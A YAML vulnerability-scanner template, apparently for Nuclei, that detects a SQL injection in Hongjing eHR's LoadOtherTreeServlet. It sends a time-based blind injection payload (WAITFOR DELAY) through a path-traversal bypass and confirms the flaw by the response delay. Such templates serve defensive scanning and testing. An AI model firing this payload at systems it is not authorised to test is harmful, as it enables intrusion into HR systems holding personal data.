id: poc-yaml-hongjing-ehr-loadothertreeservlet-sqli
info:
  name: 宏景eHR LoadOtherTreeServlet SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 宏景eHR
    fofa: app="HJSOFT-HCM"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/templates/index/hcmlogon.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "/css/hcm/login.css"
        part: body

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&flag=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "text=\"root\" title=\"root\""
        part: body
      - type: word
        words:
          - "text/xml"
        part: header
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
